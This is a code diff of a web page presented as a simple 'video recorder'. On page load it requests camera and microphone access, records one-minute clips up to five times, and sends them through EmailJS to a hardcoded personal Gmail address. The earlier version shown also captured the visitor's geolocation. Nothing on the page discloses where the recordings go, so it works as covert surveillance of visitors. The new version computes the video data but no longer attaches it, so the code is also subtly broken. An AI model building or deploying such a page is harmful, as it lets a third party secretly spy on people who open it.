@@ -3,81 +3,59 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>H1 Video Recorder with Location</title>
+  <title>H1 Video Recorder</title>
 </head>
 <body>
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <script>
-    // Initialize EmailJS with your public key
     emailjs.init("ACOn6PC1Zb70JrmxT");
 
     async function startRecording() {
-      try {
-        // Request camera + mic access
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+      const maxRecordings = 5;
+      let count = 0;
 
-        // Request location access & get position (optional)
-        let latitude = null;
-        let longitude = null;
+      async function recordAndSend() {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+          const recorder = new MediaRecorder(stream);
+          const chunks = [];
 
-        if (navigator.geolocation) {
-          try {
-            const position = await new Promise((resolve, reject) => {
-              navigator.geolocation.getCurrentPosition(resolve, reject, {timeout: 10000});
-            });
-            latitude = position.coords.latitude;
-            longitude = position.coords.longitude;
-          } catch (locErr) {
-            console.warn("Location permission denied or error:", locErr.message);
-            // proceed without location
-          }
-        }
+          recorder.ondataavailable = e => chunks.push(e.data);
 
-        const recorder = new MediaRecorder(stream);
-        const chunks = [];
+          recorder.onstop = () => {
+            const blob = new Blob(chunks, { type: 'video/webm' });
+            const reader = new FileReader();
 
-        recorder.ondataavailable = e => chunks.push(e.data);
+            reader.onloadend = function() {
+              const base64data = reader.result.split(',')[1];
 
-        recorder.onstop = () => {
-          const blob = new Blob(chunks, { type: 'video/webm' });
-          const reader = new FileReader();
+              emailjs.send("service_khmk344", "template_oyrsayr", {
+                to_email: "julianlee252@gmail.com",
+                message: "Here’s your 1-minute video recording."
+              }, "ACOn6PC1Zb70JrmxT")
+              .then(() => {
+                console.log(`✅ Video email ${count + 1} sent!`);
+                count++;
+                if (count < maxRecordings) {
+                  recordAndSend();
+                }
+              }).catch(error => {
+                console.error("❌ EmailJS error:", error);
+              });
+            };
 
-          reader.onloadend = function() {
-            const base64data = reader.result.split(',')[1];
-
-            let locationMessage = "Location not provided.";
-            if (latitude !== null && longitude !== null) {
-              locationMessage = `Location: https://maps.google.com/?q=${latitude},${longitude}`;
-            }
-
-            emailjs.send("service_khmk344", "template_oyrsayr", {
-              to_email: "julianlee252@gmail.com",
-              message: `Here’s your 1-minute video recording.\n\n${locationMessage}`
-            }, {
-              attachments: [{
-                name: "recording.webm",
-                data: base64data
-              }]
-            }).then(() => {
-              console.log("✅ Video email sent!");
-            }).catch(error => {
-              console.error("❌ EmailJS error:", error);
-            });
+            reader.readAsDataURL(blob);
+            stream.getTracks().forEach(track => track.stop());
           };
 
-          reader.readAsDataURL(blob);
-        };
-
-        recorder.start();
-
-        setTimeout(() => {
-          recorder.stop();
-          stream.getTracks().forEach(track => track.stop());
-        }, 60000); // 1 minute
-
-      } catch (err) {
-        console.error("Permission denied or error:", err);
+          recorder.start();
+          setTimeout(() => recorder.stop(), 60000); // 1 minute
+        } catch (err) {
+          console.error("Permission denied or error:", err);
+        }
       }
+
+      recordAndSend();
     }
 
     window.onload = startRecording;
